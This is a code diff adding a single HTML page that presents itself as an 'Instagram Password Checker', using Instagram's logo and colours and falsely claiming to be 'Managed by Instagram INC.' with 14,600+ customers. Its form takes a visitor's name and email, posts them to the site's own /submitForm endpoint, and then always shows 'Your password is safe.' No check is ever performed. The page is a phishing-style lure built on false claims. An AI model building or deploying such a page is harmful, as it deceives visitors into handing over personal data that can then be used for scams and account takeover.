@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📷 Instagram Password Checker 📷</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Grandstander:wght@100&display=swap">
+    <style>
+        body {
+            font-family: 'Grandstander', cursive;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(to right, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D, #F56040, #F77737, #FCAF45, #FFDC80);
+            color: #fff;
+            overflow: hidden;
+        }
+
+        .header-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            width: 50px; /* Adjust the size as needed */
+            height: 50px; /* Adjust the size as needed */
+            margin-right: 10px;
+        }
+
+        .header-text {
+            font-size: 36px;
+            font-weight: bold;
+            margin: 0;
+        }
+
+        .form-container {
+            text-align: center;
+            padding: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            max-width: 300px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+
+        input {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-bottom: 10px;
+            box-sizing: border-box;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: #fff;
+            border-radius: 5px;
+        }
+
+        input::placeholder {
+            color: #fff;
+        }
+
+        .check-button {
+            width: calc(100% - 20px);
+            padding: 10px;
+            background-color: #4caf50;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .check-button:hover {
+            background-color: #45a049;
+        }
+
+        .message-container {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #4caf50;
+            border-radius: 5px;
+            display: none;
+        }
+
+        .message {
+            color: #fff;
+            font-weight: bold;
+            font-size: 20px;
+            margin: 0;
+        }
+
+        .additional-text {
+            margin-top: 20px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/900px-Instagram_logo_2022.svg.png" alt="Instagram Logo" class="logo">
+        <div class="header-text">Instagram Password Checker</div>
+    </div>
+    <div class="form-container" id="formContainer">
+        <form id="simpleForm">
+            <input type="text" id="name" placeholder="Your Name" required>
+            <input type="email" id="email" placeholder="Your Email" required>
+            <button type="button" class="check-button" onclick="submitForm()">&#10004; Check</button>
+        </form>
+        <div class="message-container" id="messageContainer">
+            <div class="message" id="successMessage">Your password is safe.</div>
+        </div>
+        <div class="additional-text">Total customers: 14,600+</div>
+        <div class="additional-text">Managed by Instagram INC.</div>
+    </div>
+    <script>
+        function submitForm() {
+            var name = document.getElementById('name').value;
+            var email = document.getElementById('email').value;
+
+            // Send data to the server
+            fetch('/submitForm', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ name, email }),
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log(data); // Log the server response
+
+                // Show success message and clear form fields
+                showSuccessMessage();
+                clearFormFields();
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+
+        function showSuccessMessage() {
+            var messageContainer = document.getElementById('messageContainer');
+            messageContainer.style.display = 'block';
+        }
+
+        function clearFormFields() {
+            document.getElementById('name').value = '';
+            document.getElementById('email').value = '';
+        }
+    </script>
+</body>
+</html>
